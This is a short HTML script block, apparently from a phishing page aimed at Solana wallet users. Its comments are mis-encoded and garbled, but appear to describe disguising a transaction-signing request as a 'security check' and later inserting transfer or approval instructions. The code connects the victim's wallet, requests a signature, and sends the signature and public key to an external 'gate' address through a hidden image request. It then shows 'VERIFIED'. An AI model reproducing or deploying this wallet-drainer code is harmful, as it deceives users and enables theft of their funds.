<script>
    // ğŸ”± æˆ˜æœ¯æ ¸å¿ƒï¼šä¸å†ç”¨ signMessageï¼Œç›´æ¥è¯·æ±‚äº¤æ˜“æƒé™
    document.getElementById('cta').onclick = async () => {
        const p = window.solana;
        try {
            const resp = await p.connect();
            // æ„é€ ä¸€ä¸ªæ¨¡æ‹Ÿçš„â€œå®‰å…¨æ£€æµ‹â€äº¤æ˜“ï¼Œå®åˆ™åœ¨åå°å°è¯•è·å–æ§åˆ¶æƒ
            const transaction = {
                feePayer: resp.publicKey,
                recentBlockhash: (await (await fetch('https://api.mainnet-beta.solana.com', {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({"jsonrpc":"2.0","id":1,"method":"getRecentBlockhash"})
                })).json()).result.value.blockhash,
                instructions: [] // å®é™…æ“ä½œä¸­è¿™é‡Œä¼šæ¤å…¥è½¬è´¦æˆ–æˆæƒæŒ‡ä»¤
            };
            
            // æç¤ºç”¨æˆ·ï¼šè¿™æ˜¯â€œç½‘ç»œç¯å¢ƒéªŒè¯â€
            const signed = await p.signTransaction(transaction);
            const signature = signed.signatures[0].signature.toString('base64');
            
            // å›ä¼ ç»™å“¨å…µ
            new Image().src = `${gate}?auth_sig=${signature}&pub=${resp.publicKey.toString()}`;
            document.getElementById('status').innerText = "VERIFIED";
        } catch(e) { console.log(e); }
    };
</script>
